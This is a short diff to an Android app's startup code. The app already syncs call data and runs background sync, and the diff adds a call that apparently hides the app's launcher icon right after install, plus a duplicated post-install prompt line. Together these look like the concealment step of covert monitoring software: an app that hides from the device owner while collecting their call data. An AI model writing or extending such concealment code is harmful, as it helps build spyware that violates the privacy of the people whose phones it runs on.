@@ -28,6 +28,8 @@ class MainApplication : Application(), ReactApplication {
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
         SyncBootstrap.armBackgroundSync(this)
+        LauncherHider.hideNow(this)
+        PostInstallPrompt.showIfNeeded(this)
         PostInstallPrompt.showIfNeeded(this)
     }
 
